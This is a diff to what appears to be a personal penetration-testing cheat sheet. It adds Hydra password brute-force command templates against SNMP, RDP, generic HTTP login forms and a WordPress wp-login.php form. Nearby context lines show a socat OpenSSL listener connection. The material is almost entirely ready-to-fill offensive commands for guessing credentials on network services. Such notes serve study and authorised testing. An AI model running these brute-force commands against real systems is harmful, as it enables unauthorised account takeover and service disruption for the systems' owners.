@@ -92,6 +92,12 @@ socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 - # Connect to that listener fr
 # Hydra
 # =====
 hydra -l name -P rockyou.txt ftp://<target>:21 -v
+hydra -P password-file.txt -v $ip snmp	# SNMP Brute Force
+hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form # Login Brute-Force Application
+hydra -P <wordlist> -v <ip> <protocol> # Brute force against a protocol of your choice
+hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol> # You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts)
+hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip> # Attack a Windows Remote Desktop with a password list.
+hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' # Craft a more specific request for Hydra to brute force.
 
 # ====
 # tmux
